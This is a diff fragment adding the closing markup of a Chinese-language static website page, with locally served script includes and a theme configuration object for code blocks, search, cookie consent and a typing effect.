+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.17-30a67c4b"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
